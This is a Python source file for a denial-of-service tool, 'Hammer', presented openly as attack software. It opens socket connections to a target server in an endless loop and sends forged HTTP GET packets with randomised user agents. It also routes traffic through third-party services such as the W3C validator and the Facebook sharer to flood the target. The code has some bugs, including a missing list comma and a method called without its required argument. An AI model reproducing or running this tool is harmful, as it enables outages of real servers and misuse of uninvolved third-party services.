from termcolor import colored
from queue import Queue
import sys
import socket
import urllib.request
import time
import random

class FontColors:
    """
        List of Colors to print message
    """
    red = lambda text: colored(text, "red")
    blue = lambda text: colored(text, "blue")
    green = lambda text: colored(text, "green")
    yellow = lambda text: colored(text, "yellow")

class DefaultHttpParameters:
    """
        there are Default Parameters Like Headers and Requests
    """
    class Headers:
        user_agents = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41",
        "Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.2.15 Version/10.00 Opera/9.60 (Windows NT 6.0; U; en) Presto/2.1.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",
        ]
        
        accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        accept_language = "en-us,en;q=0.5"
        accept_encoding = "gzip,deflate"
        accept_charset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
        keep_alive = "115"
        Connection = "keep-alive"

    class Requests:
        get_requests = [
            "GET / HTTP/1.1",
            "GET /static HTTP/1.1",
            "GET /img HTTP/1.1"
        ]
        
        lambda_get_requests = [
            lambda x: f"GET /?{x} HTTP/1.1",
            lambda x: f"GET /admin/{x} HTTP/1.1",
            lambda x: f"GET /admin/static/img/{x} HTTP/1.1",
            lambda x: f"GET /admin/static/font/{x} HTTP/1.1",
            lambda x: f"GET /{x} HTTP/1.1",
        ]


class Hammer:
    
    """
    Hammer DOS tool
    """
    
    def __init__(self, target_server: str, target_port: int, turbo: int = 135):
        
        self.hammer_bots = ["http://validator.w3.org/check?uri=", "http://www.facebook.com/sharer/sharer.php?u="]
        self.server = target_server
        self.port = target_port
        self.turbo = turbo
        self.queue_one = Queue()
        self.queue_two = Queue()
        self.__init__socket()
    
    def __init__socket(self):
        """
            Create a socket connection for this class
        """
        
        try:
            self.h_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.h_socket.connect((self.server, self.port))
            self.h_socket.settimeout(1)
        except Exception as err:
            print(FontColors.red(err.args[1]))
            sys.exit(err.args[0])

    def server_down_attack(self):
        """
            Run Server Down Attack For Ever
        """
        
        while True:
            self.queue_one.get()
            self.down_it()
            self.queue_one.task_done()
    
    def down_it(self):
        """
            Try To down target server with fake request
        """
        
        try:
            while True:
                packet = self.packet_creator()
                h_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                h_socket.connect((self.server, self.port))
                if h_socket.sendto(packet, (self.server, self.port)):
                    h_socket.shutdown(1)
                    print(f"{FontColors.green(time.ctime)}", FontColors.green("<< Harrming Pcket Send << endl"))
                else:
                    h_socket.shutdown(1)
                time.sleep(.1)
        except socket.error as e:
            print(FontColors.red("not connection! server maybe down"))
            time.sleep(.1)
    
    def packet_creator(self) -> str:
        """
            create a packet
        """
        
        packet =  f"""{random.choice(DefaultHttpParameters.Requests.get_requests)}
Host: {self.server}
        
User-Agent: {random.choice(DefaultHttpParameters.Headers.user_agents)}
Accept: {DefaultHttpParameters.Headers.accept}
Accept-Language: {DefaultHttpParameters.Headers.accept_language}
Accept-Encoding: {DefaultHttpParameters.Headers.accept_encoding}
Accept-Charset: {DefaultHttpParameters.Headers.accept_charset}
Keep-Alive: {DefaultHttpParameters.Headers.keep_alive}
Connection: {DefaultHttpParameters.Headers.Connection}
        """

        return packet

    
    def server_bot_harrming_attack(self):
        """ Run bot Harming Attack for Ever """
        
        while True:
            self.queue_two.get()
            self.bot_hammering()
            self.queue_two.task_done()
    
    def bot_hammering(self, url):
        """Hammering with bots"""
        
        try:
            while True:
                urllib.request.urlopen(urllib.request.Request(url, \
                headers={'User-Agent': random.choice(DefaultHttpParameters.Headers.user_agents)}))
                print(FontColors.blue("bot is harming"))
                time.sleep(.1)
        except:
            time.sleep(.1)
        